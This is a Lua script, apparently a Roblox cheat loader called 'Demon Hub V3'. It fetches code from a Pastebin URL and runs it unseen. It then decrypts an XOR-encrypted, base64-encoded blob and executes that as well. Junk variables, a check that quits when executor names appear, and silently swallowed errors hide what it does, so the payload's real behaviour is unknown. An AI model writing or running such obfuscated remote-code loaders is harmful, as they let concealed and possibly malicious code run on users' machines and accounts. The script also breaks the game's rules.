--[[


██████╗░███████╗███╗░░░███╗░█████╗░███╗░░██╗  ██╗░░██╗██╗░░░██╗██████╗░  ██╗░░░██╗██████╗░
██╔══██╗██╔════╝████╗░████║██╔══██╗████╗░██║  ██║░░██║██║░░░██║██╔══██╗  ██║░░░██║╚════██╗
██║░░██║█████╗░░██╔████╔██║██║░░██║██╔██╗██║  ███████║██║░░░██║██████╦╝  ╚██╗░██╔╝░█████╔╝
██║░░██║██╔══╝░░██║╚██╔╝██║██║░░██║██║╚████║  ██╔══██║██║░░░██║██╔══██╗  ░╚████╔╝░░╚═══██╗
██████╔╝███████╗██║░╚═╝░██║╚█████╔╝██║░╚███║  ██║░░██║╚██████╔╝██████╦╝  ░░╚██╔╝░░██████╔╝
╚═════╝░╚══════╝╚═╝░░░░░╚═╝░╚════╝░╚═╝░░╚══╝  ╚═╝░░╚═╝░╚═════╝░╚═════╝░  ░░░╚═╝░░░╚═════╝░

██████╗░░█████╗░██████╗░███████╗
╚════██╗██╔══██╗╚════██╗██╔════╝
░░███╔═╝██║░░██║░░███╔═╝██████╗░
██╔══╝░░██║░░██║██╔══╝░░╚════██╗
███████╗╚█████╔╝███████╗██████╔╝
╚══════╝░╚════╝░╚══════╝╚═════╝░                                                                                              
--]]

-- Get and run remote script from Pastebin
local url = "https://pastebin.com/raw/cbBsFWLF"
local response = game:HttpGet(url)
local func = loadstring(response)
func()
task.wait(1)

-- 🔒 Protected by Premium Lua Obfuscator V2.0
local wescwg = 2838
local obuoxggsm = math.random(100, 999)
local vwyiucfqlo = tostring(446)
local egmdcyjzhhkn = tostring(914)
local hvkmhi = tostring(626)
local gvdhermykgu = 'Zay your amazing keep shining'
local yiczfpn = math.random(100, 999)
local ukwolnaq = 'Bailey your looking great today'
local dptgovldix = 'security layer engaged'
local bwypre = tostring(603)
local ptmjbhpt = math.random(100, 999)
local whitbp = tostring(350)
local fjxzuygrmz = 'premium obfuscation active'
local qtimjbfgzxze = 2341
local ucvxszx = math.random(100, 999)
local qrekhjt = math.random(100, 999)
local hzbbexgxig = tostring(530)
local dacptk = tostring(114)
local tplyynebqf = 7158
local gocfsjhmv = math.random(100, 999)


-- VM Detection
local uvdxuimn = debug and debug.getinfo or function() return nil end
if uvdxuimn and uvdxuimn(1, "S") then
    local info = uvdxuimn(1, "S")
    if info and info.source then
        local source = string.lower(info.source)
        if string.find(source, "synapse") or string.find(source, "script-ware") or 
           string.find(source, "krnl") or string.find(source, "sentinel") then
            return
        end
    end
end


-- Lua 5.1 Compatible XOR function
local function donwkztv(a, b)
    local result = 0
    local bitval = 1
    while a > 0 or b > 0 do
        local a_bit = a % 2
        local b_bit = b % 2
        if a_bit ~= b_bit then
            result = result + bitval
        end
        bitval = bitval * 2
        a = math.floor(a / 2)
        b = math.floor(b / 2)
    end
    return result
end

-- Decryption function with Lua 5.1 compatibility
local function decrypt(data, key)
    local ibdkdxym = {}
    local keyLen = #key
    for i = 1, #data do
        local keyChar = string.byte(key, ((i - 1) % keyLen) + 1)
        ibdkdxym[i] = string.char(donwkztv(data[i], keyChar))
    end
    return table.concat(ibdkdxym)
end

-- Encrypted data
local eduhlfar = {9,9,87,17,49,87,18,71,50,40,19,30,23,87,53,84,73,24,36,12,10,0,24,120,43,99,40,61,44,20,74,48,39,51,38,70,30,15,47,64,43,6,22,26,4,34,104,81,112,31,48,0,10,95,4,121,18,6,55,50,17,11,119,33,11,35,95,12,30,31,47,64,37,5,115,9,2,49,62,65,100,53,9,3,30,4,0,24,28,0,22,44,18,11,116,119,38,55,83,25,8,11,48,66,49,92,116,30,47,87,101,87,97,38,30,12,10,95,4,58,1,25,47,108,43,96,116,63,36,13,82,24,30,8,44,2,12,40,115,89,47,34,104,82,115,38,17,29,9,41,115,51,44,25,44,37,42,62,69,51,28,104,15,30,49,15,18,68,10,93,104,6,47,38,19,82,122,41,40,74,48,0,46,60,18,40,83,47,44,4,111,113,39,29,94,28,11,50,17,80,9,43,23,94,20,50,27,75,112,34,83,16,49,95,119,35,17,9,55,98,42,20,31,44,28,13,16,17,49,31,87,67,49,55,116,1,1,8,41,83,112,41,14,13,28,95,58,63,17,99,32,38,1,20,111,127,31,104,49,70,8,8,48,66,12,6,100,24,46,12,19,85,78,38,83,16,55,42,46,63,42,56,1,37,43,62,112,118,33,2,45,3,27,35,95,113,60,3,127,9,23,50,100,83,101,67,30,12,10,95,4,58,1,22,17,108,43,97,112,118,39,13,49,70,11,61,52,95,49,2,94,2,2,87,41,78,115,67,32,9,26,37,23,112,43,99,48,38,18,4,104,118,10,104,31,0,11,87,32,68,33,40,81,87,41,50,100,79,115,38,40,8,28,95,58,63,17,99,32,38,1,20,127,127,33,29,94,3,54,50,87,94,50,55,111,89,47,34,104,82,115,38,17,29,9,3,20,60,17,98,52,37,42,97,18,33,31,35,15,15,25,50,30,65,49,93,96,29,4,34,101,75,72,8,30,22,3,62,11,32,4,18,47,60,4,27,82,127,39,29,94,28,11,50,17,80,49,59,22,23,3,49,8,15,72,54,95,16,10,58,53,46,44,21,87,98,46,4,124,48,38,51,37,5,2,49,39,68,49,60,22,22,4,34,3,78,99,57,52,24,49,43,114,112,18,18,14,38,3,4,112,51,31,30,19,5,48,87,40,95,10,44,100,29,29,49,20,15,72,54,95,16,10,58,53,46,18,63,48,32,17,96,116,54,39,104,83,17,51,54,1,71,10,40,31,4,20,50,38,95,72,27,87,23,24,42,15,38,43,56,30,38,4,20,81,54,9,30,42,68,25,50,17,14,10,44,85,22,2,87,41,78,115,67,32,9,26,42,122,112,18,56,14,63,3,27,111,53,39,25,31,5,25,87,82,67,37,60,77,29,0,31,8,72,72,53,87,9,24,95,118,126,43,60,48,101,44,11,108,51,12,29,95,17,8,50,83,92,39,93,18,87,23,38,57,72,97,50,13,10,9,59,49,49,16,5,87,32,7,96,66,41,36,13,31,26,27,34,17,15,33,92,111,9,23,34,105,95,72,54,95,16,10,58,53,46,42,21,87,37,3,16,74,54,31,51,37,70,5,87,30,83,12,40,78,2,47,12,19,78,122,41,52,24,49,43,115,37,42,25,40,57,1,20,30,127,39,51,83,3,11,28,14,66,36,43,99,29,0,54,61,84,72,28,55,77,55,43,54,33,16,5,87,32,4,58,19,44,14,29,95,5,31,54,17,79,35,56,112,12,4,87,4,74,103,39,86,9,49,4,58,33,24,6,94,38,42,42,94,46,14,32,34,17,8,50,83,92,39,92,108,2,41,45,7,65,72,24,36,74,10,58,8,58,18,2,83,63,42,97,19,44,28,2,54,25,8,54,10,91,10,2,119,89,47,34,104,82,115,38,17,29,55,41,115,39,3,18,5,44,6,7,65,63,11,32,54,15,28,49,1,78,38,59,77,23,3,31,4,65,103,39,1,3,29,57,3,48,6,43,55,45,5,7,111,117,20,14,46,69,28,49,47,4,38,60,69,30,2,87,41,78,115,67,32,9,26,42,23,112,17,60,10,101,1,20,96,51,31,25,37,31,51,61,55,66,49,1,78,24,46,12,19,78,73,24,36,23,55,58,119,35,44,22,10,35,42,58,78,53,9,29,95,6,48,34,95,93,49,56,81,9,47,12,41,84,122,37,35,9,30,46,0,122,41,22,10,38,18,0,100,53,21,48,38,17,11,50,83,92,33,40,30,69,0,38,19,83,72,8,36,9,49,95,12,33,42,18,36,63,4,20,99,127,39,25,50,15,30,34,94,91,37,6,100,30,23,12,19,82,76,27,87,18,26,37,16,38,18,6,82,50,18,7,23,42,14,104,83,17,8,50,83,92,33,40,81,29,47,28,41,77,122,34,14,9,31,58,15,57,4,43,47,38,3,20,30,50,28,9,12,0,31,12,30,66,35,5,111,9,23,50,100,83,99,54,10,23,26,42,53,113,42,40,36,101,41,20,112,51,12,29,16,79,48,28,36,91,10,2,119,9,41,87,57,72,72,54,51,29,49,41,118,62,1,22,52,35,1,20,94,48,28,104,33,5,27,34,94,14,10,44,115,23,4,34,61,85,99,54,94,81,30,46,0,121,41,22,48,32,1,20,115,127,31,9,19,3,27,34,48,66,50,44,100,29,1,34,101,1,97,54,17,14,49,20,41,63,5,56,30,32,3,57,111,33,31,13,82,29,27,45,44,91,12,39,112,23,47,12,19,84,99,54,48,15,9,46,0,58,42,99,40,61,42,16,100,43,33,13,82,28,54,34,10,65,10,6,100,27,6,34,101,75,72,50,30,12,24,58,46,36,1,22,94,50,44,20,78,42,39,51,37,5,48,87,40,95,10,44,100,29,29,54,57,77,102,11,44,31,24,42,53,61,5,2,13,37,2,7,108,35,14,25,15,0,30,49,35,71,36,60,78,29,1,49,20,72,97,11,35,10,28,94,8,37,44,25,48,44,42,58,100,53,9,13,16,26,31,49,18,91,10,39,104,2,4,34,41,78,115,67,32,9,26,42,53,112,5,61,82,58,42,16,22,62,14,14,19,15,8,61,52,6,11,2,18,1,47,12,4,87,72,50,18,9,24,57,118,112,42,18,10,61,42,62,119,33,8,9,37,0,49,12,39,64,39,93,112,27,23,33,37,84,72,28,55,77,49,42,123,35,17,6,17,50,42,23,22,62,10,104,31,0,11,87,32,68,33,40,124,95,47,8,31,8,75,38,95,15,26,42,122,38,3,6,30,35,17,97,96,53,12,29,42,5,11,54,30,66,36,40,30,87,46,12,57,8,102,54,17,9,49,46,49,51,3,5,18,63,24,4,115,41,28,35,16,14,29,33,1,71,49,59,23,2,6,34,20,75,103,37,1,78,24,58,118,112,18,2,14,32,4,23,99,114,10,25,11,0,2,50,51,88,10,22,81,22,2,33,54,72,72,53,87,9,24,23,19,126,43,60,48,101,44,11,108,51,14,29,95,7,31,49,63,4,38,21,69,23,0,49,8,72,97,8,14,15,24,7,27,120,6,5,43,103,3,0,85,41,28,9,8,15,28,49,63,71,35,93,107,89,23,50,100,83,101,67,30,12,10,95,4,58,1,22,60,100,42,62,104,118,36,13,94,3,27,34,35,88,35,56,94,24,20,87,23,75,99,54,82,67,9,62,42,48,3,25,55,38,42,16,94,53,14,9,16,14,29,33,1,71,39,93,81,87,47,38,34,64,101,66,44,22,55,37,20,48,42,56,36,32,7,97,112,51,31,30,19,5,48,87,40,95,10,44,100,3,41,50,100,82,78,54,10,12,49,4,0,39,3,18,10,38,42,97,104,46,39,25,37,5,2,50,94,88,35,59,82,29,47,87,31,80,72,50,36,12,3,58,122,38,3,5,18,38,42,97,104,46,39,25,37,28,2,49,35,0,10,40,31,4,20,50,38,95,112,37,86,21,49,4,42,63,4,21,35,38,5,57,103,54,14,51,0,15,10,15,43,78,35,60,77,28,47,33,37,75,72,67,40,18,49,46,0,58,24,6,82,58,42,42,81,63,8,9,16,12,31,54,13,0,10,40,31,4,20,50,38,95,72,27,86,21,24,46,114,49,3,7,83,32,3,20,30,53,8,32,46,6,25,49,18,71,50,6,78,29,29,49,97,79,97,41,52,21,9,58,118,46,41,6,63,58,18,7,22,127,8,25,11,70,51,34,48,66,33,39,108,2,41,45,7,65,72,24,36,15,24,7,3,126,18,6,30,47,18,0,100,53,21,14,34,65,11,31,86,64,39,93,112,27,23,33,37,84,72,57,40,22,50,58,27,38,42,21,86,108,5,57,103,118,11,35,11,70,51,34,48,66,33,39,108,2,41,45,7,65,72,24,14,22,3,57,114,62,3,6,32,32,18,16,78,51,14,51,0,14,30,31,39,71,35,56,31,23,6,34,101,73,97,53,39,12,30,46,41,57,7,99,48,32,18,23,82,63,31,2,53,71,49,8,82,80,11,22,78,27,1,34,38,76,103,37,39,3,30,20,41,56,3,22,43,39,3,20,115,48,14,30,45,19,28,49,47,71,35,60,77,89,23,50,100,83,101,67,30,12,10,95,4,58,1,22,13,108,42,41,82,53,39,104,41,30,48,38,36,90,12,56,19,4,41,34,61,78,72,24,36,23,24,42,118,57,42,22,95,63,17,4,81,33,39,32,19,6,8,12,14,66,10,92,119,9,47,12,61,8,75,54,48,15,26,42,118,112,41,2,1,37,7,97,74,43,14,29,83,79,2,49,39,71,12,40,78,2,47,12,19,65,112,41,52,75,48,0,118,39,2,43,18,57,42,62,119,113,31,13,82,29,29,87,94,14,49,22,78,94,1,34,38,75,72,50,18,15,31,57,7,57,7,99,17,108,42,16,82,51,10,104,31,0,11,87,32,68,33,40,18,87,40,86,96,85,72,66,47,29,49,41,114,49,4,18,40,35,1,20,116,48,12,29,82,20,48,35,86,14,50,44,78,2,6,45,24,87,115,8,14,12,31,42,53,58,42,18,13,37,4,23,99,114,10,25,12,6,8,50,83,92,33,39,108,2,41,45,7,65,72,24,36,21,24,42,118,57,7,99,48,32,18,23,82,53,39,104,41,30,48,38,36,68,56,56,30,89,47,34,104,82,115,38,17,29,9,3,20,60,17,98,52,37,42,97,18,33,36,25,0,3,30,12,82,71,11,2,112,94,41,61,27,77,79,8,82,15,31,3,114,58,44,2,1,59,1,42,69,53,9,51,83,3,25,50,48,66,50,44,100,29,47,87,31,80,72,50,36,23,55,58,119,35,44,22,10,35,42,58,100,45,14,25,11,5,48,87,40,95,10,44,100,23,29,61,34,79,76,37,18,9,49,95,12,33,42,18,36,37,24,11,82,127,10,104,31,0,11,87,32,68,33,40,81,87,40,86,97,15,72,54,95,16,10,58,53,46,44,21,87,98,43,58,94,51,36,13,16,5,51,54,30,66,9,56,81,29,47,45,97,15,72,54,95,16,10,58,53,46,42,21,87,35,3,16,74,53,39,104,41,30,48,38,36,93,56,55,82,87,2,87,11,78,73,24,36,12,3,57,7,58,42,18,36,62,42,42,100,53,39,104,41,30,48,38,36,66,56,56,99,1,6,49,37,75,72,67,40,18,49,46,0,58,7,99,10,56,3,20,18,127,21,14,42,6,54,34,14,91,10,6,100,29,29,54,57,80,97,50,10,81,3,57,3,57,7,99,48,38,43,97,112,54,31,51,15,3,2,49,86,64,35,55,116,1,23,50,101,95,72,53,87,20,24,46,41,126,18,6,30,47,18,4,74,43,14,29,83,79,2,49,35,71,12,40,78,2,47,12,19,75,122,38,63,21,24,57,54,37,42,60,55,98,17,98,82,48,29,14,86,5,29,87,48,66,50,43,82,94,26,31,27,92,122,38,43,29,9,0,123,48,1,22,35,108,5,0,94,48,14,25,11,29,48,28,36,68,10,93,104,6,47,38,19,82,122,38,51,21,49,20,37,57,4,21,47,101,7,0,77,113,39,29,94,28,11,50,17,80,10,21,23,2,6,34,105,87,97,34,17,2,28,41,37,57,7,99,30,35,17,97,96,53,12,29,50,79,48,12,14,93,36,43,99,29,0,12,58,15,72,54,95,16,10,58,53,46,42,21,87,32,3,20,30,53,8,9,16,14,31,54,13,0,10,40,31,4,20,50,38,95,72,53,87,77,49,46,58,60,3,22,43,38,5,42,81,62,8,9,12,5,48,8,10,68,36,40,19,30,47,38,41,78,76,37,18,10,9,4,42,37,24,5,86,34,3,11,116,41,31,13,83,17,48,35,21,77,48,59,23,27,6,34,28,75,103,37,47,9,30,7,3,57,7,99,30,55,6,5,22,127,39,51,15,28,30,33,47,79,36,43,111,91,6,49,37,84,72,57,40,22,50,58,27,38,18,5,86,108,5,0,74,118,36,29,49,3,27,34,30,85,37,94,22,87,47,12,57,78,102,53,35,3,31,41,15,51,3,5,18,57,42,27,104,42,36,13,62,25,8,49,86,14,37,6,74,94,44,34,7,77,99,54,30,24,30,92,114,112,42,56,14,35,4,23,99,63,9,30,42,15,25,54,86,79,37,43,119,90,3,49,50,9,101,67,48,9,48,95,20,57,18,56,14,57,24,7,22,60,14,2,53,25,8,50,82,80,10,41,85,20,21,49,96,77,97,54,94,9,30,57,11,58,5,43,47,37,4,7,99,49,11,30,0,71,28,31,51,0,10,41,85,95,21,49,96,77,97,54,43,9,30,7,7,58,5,59,13,37,7,97,112,51,31,30,19,15,5,87,32,83,56,56,81,89,23,50,100,83,101,66,52,24,29,43,114,112,17,2,1,37,7,97,124,48,38,51,37,5,2,49,35,68,10,22,65,30,23,34,105,95,75,39,18,9,31,57,4,45,24,6,55,58,3,7,82,42,39,55,54,65,49,8,48,7,12,55,108,27,4,45,0,15,112,38,83,17,28,95,58,63,17,99,32,38,1,20,124,119,39,55,41,70,51,50,95,66,33,40,77,1,47,38,41,77,102,54,82,10,49,42,123,35,17,6,17,50,18,7,23,53,18,32,33,18,29,87,30,65,49,93,96,29,4,34,105,1,72,55,21,3,11,57,54,58,42,99,40,61,42,16,100,51,21,13,31,20,31,84,86,0,10,40,31,4,20,50,38,95,72,53,87,9,4,23,16,45,7,98,44,57,44,27,112,63,39,51,37,27,54,50,83,93,12,40,74,24,47,12,54,77,102,24,82,10,49,42,123,35,17,6,17,50,17,7,23,42,10,104,31,0,11,87,32,68,33,40,30,87,47,31,37,75,72,67,40,18,49,46,0,60,24,6,82,98,42,20,31,44,28,13,16,17,48,15,87,68,39,93,94,24,20,87,23,75,99,54,17,67,50,46,0,58,42,99,40,61,42,16,100,48,21,14,34,65,48,34,95,93,49,56,81,9,47,33,97,76,103,37,18,9,49,95,12,33,42,18,36,44,24,11,82,127,10,104,31,0,11,87,32,68,33,40,107,87,40,28,101,77,102,31,86,77,49,42,123,35,17,6,17,50,18,7,23,119,14,25,4,28,24,28,17,66,36,6,18,30,1,49,20,15,72,54,95,16,10,58,53,46,42,21,87,98,46,7,82,53,39,104,41,30,48,38,36,7,56,55,82,87,2,87,11,78,73,24,36,9,3,57,3,58,18,2,36,62,42,42,100,54,31,51,15,5,2,15,87,66,35,55,116,1,23,50,101,95,73,29,18,9,31,58,119,45,24,6,40,55,42,16,85,62,29,14,19,26,48,45,40,91,33,39,116,12,47,35,97,1,115,64,18,9,24,23,4,45,7,99,48,32,18,23,82,42,39,55,54,65,48,34,95,93,49,56,81,9,47,33,96,84,102,38,82,8,30,62,0,58,42,99,40,61,42,16,100,51,10,104,31,0,11,87,32,68,33,40,81,89,41,87,57,72,72,54,51,29,55,37,8,120,18,2,36,62,42,42,100,51,21,13,33,20,48,84,86,0,10,43,23,27,26,31,23,92,101,67,10,23,26,42,53,112,24,5,39,50,44,20,78,42,39,51,37,29,48,28,36,78,50,55,116,95,46,8,101,95,112,38,83,17,28,95,20,58,43,99,51,50,18,20,30,33,38,55,49,70,54,61,44,66,33,40,112,27,23,33,37,84,72,28,55,77,49,23,115,63,3,43,35,98,18,4,19,45,10,104,49,3,8,33,18,91,10,2,119,89,46,8,7,8,78,41,44,15,26,42,41,38,18,18,1,37,4,27,82,127,9,29,46,25,25,54,13,88,35,59,82,2,47,8,0,72,97,50,13,71}
local hhuznakq = "EZgvRef7ho&nMeQ8*qfzSmBIHQfUHS&F"

-- Decode and execute
local ufjdpyce = decrypt(eduhlfar, hhuznakq)

-- Base64 decode function - Lua 5.1 compatible
local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
local function b64decode(data)
    data = string.gsub(data, '[^'..b64chars..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b64chars:find(x)-1)
        for i=6,1,-1 do 
            r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') 
        end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do 
            c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) 
        end
        return string.char(c)
    end))
end

-- Execute the decoded script
local final_code = b64decode(ufjdpyce)
local execute_func = loadstring or load
if execute_func then
    local success, err = pcall(function()
        local compiled_func = execute_func(final_code)
        if compiled_func then
            compiled_func()
        end
    end)
    if not success then
        -- Silent fail for security
    end
end
